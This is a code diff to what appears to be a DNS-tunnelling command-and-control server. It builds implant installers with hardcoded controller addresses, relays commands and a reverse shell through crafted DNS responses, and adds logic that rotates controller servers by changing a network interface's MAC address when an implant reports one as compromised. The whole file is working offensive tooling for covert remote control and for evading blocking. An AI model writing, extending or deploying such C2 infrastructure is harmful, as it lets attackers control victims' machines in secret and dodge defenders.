@@ -5,13 +5,31 @@ import random
 import time
 import os
 import base64
+import secrets
+import subprocess
+import json
 
-def createInstaller(host):
+global TO_BE_ROTATED; TO_BE_ROTATED = []
+
+def createInstaller(host, isFile=False):
     if(os.path.exists('./client.py')):
         print("Creating installer located at ./installer.py...")
         f = open('./client.py', 'r')
         clientConts = f.read()
-        clientConts = clientConts.replace("SERVER = ''", "SERVER = '" + host + "'")
+        if not isFile:
+            clientConts = clientConts.replace("SERVER = ''", "SERVER = '" + host + "'")
+        else:
+            f = open(host, 'r')
+            hostList = []
+            hosts = f.readlines()
+            for h in hosts:
+                if len(h.strip()) > 0 and not h.startswith("#"):
+                    hostList.append(h.strip())
+            f.close()
+            if len(hostList) == 0:
+                print("Error: file is empty")
+                exit()
+            clientConts = clientConts.replace("SERVER = ''", "SERVER = " + repr(hostList))
         f.close()
         f = open('./installer.py', 'w')
         
@@ -64,10 +82,14 @@ OR: server.py -s {ip of server}     |     This will create an install file for t
 """)
     exit()
 elif (sys.argv[1] == "-s"):
-    createInstaller(sys.argv[2])
+    if os.path.exists(sys.argv[2]):
+        print("File input detected, using file for list of hosts")
+        createInstaller(sys.argv[2], isFile=True)
+    else:
+        createInstaller(sys.argv[2])
     exit()
 else:
-    LISTEN_IP = sys.argv[1]
+    LISTEN_IP = "0.0.0.0"
 
 def parse_qname(data, offset):
     qname = []
@@ -205,6 +227,118 @@ def sendResponseE(sock, data, addr, command):
         return
     handleResponse(sock, data, addr, to_base64(command), 'TXT')
 
+def sendResponseF(sock, data, addr, part1, part2):
+    addressList = ["" + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(part1), part2]
+    handleResponse(sock, data, addr, addressList)
+
+def sendResponseG(sock, data, addr, ip1, ip2):
+    handleResponse(sock, data, addr, [ip1, ip2])
+
+def rotateServer(distance, ip_hex, addr):
+    old_ip = None
+    TO_BE_ROTATED.append(socket.inet_ntoa(bytes.fromhex(ip_hex)))
+    if len(TO_BE_ROTATED) > 1:
+        old_ip = TO_BE_ROTATED[0]
+        _, _, new_ip = change_mac_by_ip(old_ip)
+    for _, _, filename in os.walk("/tmp/chimera/"):
+        for file in filename[2]:
+            if file != addr[0]:
+                f = open("/tmp/chimera/" + file, "r")
+                currentConts = f.readlines()
+                f.close()
+                newConts = []
+                newConts.append("rotate")
+                newConts.append(str(distance))
+                newConts.append(new_ip)
+                for line in currentConts:
+                    newConts.append(line)
+                f = open("/tmp/chimera/" + file, "w")
+                f.write('\n'.join(newConts))
+    if old_ip:
+        f = open(f"/tmp/chimera/{addr[0]}", "r")
+        currentConts = f.readlines()
+        f.close()
+        newConts = ["update", old_ip, new_ip]
+        for item in currentConts:
+            newConts.append(item)
+        f = open(f"/tmp/chimera/{addr[0]}", "w")
+        f.write('\n'.join(newConts))
+
+def run_ip(*args):
+    return subprocess.run(
+        ["ip", *args],
+        capture_output=True,
+        text=True,
+        check=True
+    ).stdout
+
+
+def get_interface(ip_address):
+    interfaces = json.loads(run_ip("-j", "addr", "show"))
+
+    for interface in interfaces:
+        for addr in interface.get("addr_info", []):
+            if addr.get("local") == ip_address:
+                return interface["ifname"]
+
+    return None
+
+
+def get_ip(interface):
+    interfaces = json.loads(
+        run_ip("-j", "-4", "addr", "show", "dev", interface)
+    )
+
+    for interface_info in interfaces:
+        for addr in interface_info.get("addr_info", []):
+            if addr.get("family") == "inet":
+                return addr["local"]
+
+    return None
+
+
+def generate_mac():
+    mac = bytearray(secrets.token_bytes(6))
+
+    # Locally administered, unicast MAC
+    mac[0] = (mac[0] | 0x02) & 0xFE
+
+    return ":".join(f"{x:02x}" for x in mac)
+
+
+def change_mac_by_ip(ip_address, timeout=30):
+    interface = get_interface(ip_address)
+
+    if interface is None:
+        raise ValueError(f"No interface found for {ip_address}")
+
+    new_mac = generate_mac()
+
+    print(f"Interface: {interface}")
+    print(f"New MAC: {new_mac}")
+
+    # Disable interface
+    run_ip("link", "set", "dev", interface, "down")
+
+    # Change MAC
+    run_ip("link", "set", "dev", interface, "address", new_mac)
+
+    # Re-enable interface
+    run_ip("link", "set", "dev", interface, "up")
+
+    # Wait for IPv4 address
+    deadline = time.monotonic() + timeout
+
+    while time.monotonic() < deadline:
+        new_ip = get_ip(interface)
+
+        if new_ip:
+            return interface, new_mac, new_ip
+
+        time.sleep(1)
+
+    raise TimeoutError("No IPv4 address assigned")
+
 def run(bind_ip=LISTEN_IP, port=53):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((bind_ip, port))
@@ -244,7 +378,11 @@ def run(bind_ip=LISTEN_IP, port=53):
                 elif (command == "service"):
                     sendResponseA(sock, data, addr, 150)
                 elif (command == "command"):
-                    sendResponseD(sock, data, addr, 65)
+                    sendResponseA(sock, data, addr, 65)
+                elif (command == "rotate"):
+                    sendResponseA(sock, data, addr, 25)
+                elif (command == "update"):
+                    sendResponseA(sock, data, addr, 55)
             else:
                 sendResponseA(sock, data, addr, 100)
         elif (domain == "securelogin.com"): #Reverse Shell
@@ -288,6 +426,27 @@ def run(bind_ip=LISTEN_IP, port=53):
                 command = contSplit[0]
                 del(contSplit[0])
                 sendResponseE(sock, data, addr, command)
+            else:
+                sendResponseA(sock, data, addr, 100)
+        elif (('supportcenter.net' in domain) and domain[0] in ['1', '2', '3', '4', '5', '6', '7', '8', '9']): #Rotate server index
+            sendResponseA(sock, data, addr, 100)
+            distance = int(domain[0])
+            compromised_ip = domain.split('.')[1]
+            rotateServer(distance, compromised_ip, addr)
+        elif (domain == "sendhelp.com"):
+            if(len(contSplit) >= 2):
+                sendResponseF(sock, data, addr, contSplit[0], contSplit[1])
+                del(contSplit[0])
+                del(contSplit[0])
+            else:
+                sendResponseA(sock, data, addr, 100)
+        elif (domain == "findthings.org"):
+            if(len(contSplit) >= 1):
+                sendResponseG(sock, data, addr, contSplit[0], contSplit[1])
+                del(contSplit[0])
+                del(contSplit[0])
+            else:
+                sendResponseA(sock, data, addr, 100)
             
         newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
         newCont = '\n'.join(newContSplit)
